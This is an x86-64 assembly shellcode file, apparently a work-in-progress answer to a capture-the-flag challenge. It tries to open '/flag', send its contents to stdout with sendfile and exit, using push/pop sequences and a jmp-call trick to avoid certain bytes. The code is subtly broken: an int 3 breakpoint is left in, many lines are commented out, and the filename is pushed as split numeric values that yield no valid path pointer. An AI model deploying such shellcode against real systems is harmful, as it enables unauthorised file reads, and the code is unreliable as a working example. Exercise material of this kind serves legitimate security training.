.global _start
_start:
.intel_syntax noprefix
    #jmp do_call
jmp_back:
    #pop rcx       #pop "/flag" filename
    #push rcx
    push 0x67616
    push 0xc662f
    pop rdi
    push 0x2
    pop rax #syscall number of open
    #push rsp
    #pop rdi		# point the first argument at stack (where we have "/flag")
    push 0x0 				
    pop rsi				# NULL out the second argument (meaning, O_RDONLY)
    int 3
    syscall				# trigger open("/flag", NULL)
    push 0x1
    pop rdi
    #mov rdi, 1				# first argument to sendfile is the file descriptor to output to (stdout)
    push rax
    pop rsi				# second argument is the file descriptor returned by open
    push 0x0
    pop rdx
    #mov rdx, 0				# third argument is the number of bytes to skip from the input file
    #mov r10, 1000				# fourth argument is the number of bytes to transfer to the output file
    push 1000
    pop r10
    #mov rax, 40				# syscall number of sendfile
    push 40
    pop rax
    syscall				# trigger sendfile(1, fd, 0, 1000)
    #mov rax, 60				# syscall number of exit
    push 60
    pop rax
    syscall				# trigger exit()

do_call:
    call jmp_back # will push filename to stack top
filename:
    .ascii "test"